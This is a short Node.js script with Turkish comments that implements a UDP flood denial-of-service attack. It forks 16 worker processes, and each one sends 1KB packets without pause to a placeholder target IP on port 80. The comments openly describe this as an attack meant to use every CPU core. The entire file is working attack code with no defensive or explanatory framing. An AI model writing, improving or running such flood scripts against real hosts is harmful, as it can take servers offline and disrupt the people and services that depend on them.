const dgram = require('dgram');
const client = dgram.createSocket('udp4');
const cluster = require('cluster'); // İşlemcinin tüm çekirdeklerini kullanmak için

// Ryzen 9'un 16 Çekirdeğinin Hepsini Devreye Sokuyoruz
if (cluster.isMaster) {
    console.log("🔥 RYZEN 9 9950X TÜM ÇEKİRDEKLER ATEŞLENİYOR...");
    for (let i = 0; i < 16; i++) { cluster.fork(); } // 16 çekirdeği de saldırıya ayır
} else {
    const message = Buffer.alloc(1024, 'X'); // Paket boyutu yine 1KB (İdeal olan bu)
    const targetIp = 'DENEME_SERVER_IP';
    const targetPort = 80;

    // Durmaksızın ateşle!
    function attack() {
        for(let i=0; i<1000; i++) {
            client.send(message, 0, message.length, targetPort, targetIp);
        }
        setImmediate(attack); // İşlemciyi hiç dinlendirmeden döngüye sok
    }
    attack();
}
